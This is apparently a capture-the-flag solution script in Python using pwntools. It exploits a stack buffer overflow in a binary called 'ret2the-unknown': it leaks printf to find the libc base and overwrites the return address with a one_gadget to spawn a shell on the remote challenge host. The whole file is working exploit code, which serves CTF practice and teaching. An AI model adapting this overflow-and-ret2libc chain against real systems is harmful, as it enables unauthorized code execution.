from pwn import *
import re

HOST, PORT = "mc.ax", 31568
BINARY = './ret2the-unknown'
# context.log_level = 'critical'

elf = ELF(BINARY)
libc = ELF('./libc-2.28.so')

def start():
    if not args.REMOTE:
        print("LOCAL PROCESS")
        return process(BINARY)
    else:
        print("REMOTE PROCESS")
        return remote(HOST, PORT)

def solve():
    p = start()
    saved_rbp = 0x401200
    main_addr = 0x00401186

    # gdb.attach(p, '''
    # # Wait until we hit the main executable's entry point
    # # break *0x004011f9
    # # break *0x00401231
    # # break *0x00401236
    # break *0x00401237
    # continue
    # ''')

    # Loop back to main
    loop_payload = b'a' * 32
    loop_payload += p64(saved_rbp)
    loop_payload += p64(main_addr)

    p.sendlineafter('where is this place? can you help me get there safely?', loop_payload)

    # Get address of printf
    p.recvline()
    p.recvline()
    leak = p.recvline().decode()
    printf_addr = int(leak[-13:], 16)
    log.info('Printf address: ' + (hex(printf_addr)))

    # Actual payload
    libc_base = printf_addr - libc.symbols['printf']
    one_gadget = libc_base + 0x4484f # 0x448a3, 0xe5456

    log.info('Libc base: ' + hex(libc_base))
    log.info('one_gadget: ' + hex(one_gadget))

    payload = b'a' * 32
    payload += p64(saved_rbp)
    payload += p64(one_gadget)
    p.sendlineafter('where is this place? can you help me get there safely?', payload)

    p.recvuntil('good luck!')
    p.interactive()

solve()